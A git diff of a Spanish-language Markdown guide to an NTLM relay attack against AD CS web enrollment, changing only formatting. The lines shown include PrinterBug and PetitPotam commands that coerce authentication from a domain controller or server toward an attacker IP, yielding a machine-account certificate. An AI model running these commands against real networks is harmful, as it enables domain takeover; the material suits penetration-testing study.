@@ -33,14 +33,16 @@ Se intercepta una autenticación NTLM forzada y se relayea a la web de AD CS (`/
 
 2. **Forzar la autenticación de la víctima:**
    * **Contra un DC (PrinterBug / MS-RPRN):**
-     > *Requiere que la máquina objetivo tenga activo el servicio de cola de impresión (Spooler).*
-     ```bash
+ > *Requiere que la máquina objetivo tenga activo el servicio de cola de impresión (Spooler).*
+
+```bash
      python3 printerbug.py CORP.LOCAL/user:password@<IP_DC> <IP_Atacante>
-     ```
+```
+
    * **Contra otros servidores (PetitPotam / MS-EFSR sin parche):**
-     ```bash
+ ```bash
      python3 petitpotam.py <IP_Atacante> <IP_Victima>
-     ```
+ ```
 
 3. **Resultado:**
    Se genera y guarda localmente un archivo `.pfx` correspondiente a la cuenta forzada (ej. `DC01$.pfx`):
